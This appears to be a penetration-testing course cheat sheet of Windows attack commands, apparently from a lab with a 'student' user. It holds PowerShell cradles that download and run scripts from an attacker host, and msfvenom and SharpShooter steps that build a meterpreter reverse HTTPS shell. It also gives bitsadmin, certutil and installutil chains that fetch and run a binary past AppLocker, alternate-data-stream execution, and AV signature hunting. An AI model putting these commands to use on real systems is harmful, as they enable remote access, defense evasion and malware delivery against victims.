# Proxies
## Remap reg hive
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
```

## Change UA of webclient
```
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

## Get Proxy settings as SYSTEM
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}

$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.49.71/clip.txt")
```
## Create Jscript rev shell and vbscript
```
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
DotNetToJScript.exe ExampleAssembly.dll --lang=vbscript --ver=v4 -o demo.vbs
```
## Sharpshooter

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o /var/www/html/shell.txt
┌──(kali㉿kali)-[/opt/SharpShooter]
└─$ sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test

```
# LOLBINS
## File download and applocker bypass exe

```
bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt
certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe
del C:\users\student\enc.txt
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```
or
```
cmd /c 'bitsadmin /Transfer myJob http://192.168.49.71/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe'
```
# Applocker Bypass
## Copy to unprotected directories
```
copy Bypass.exe C:\Windows\Tasks
C:\Windows\Tasks\Bypass.exe 
```
## ADS
file must be both writable and executable
```
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```
## installutil
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
```
## Download, decode, installutil
```
bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```
# AV
## Find signature
```
Import-Module .\Find-AVSignature.ps1
Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force
```
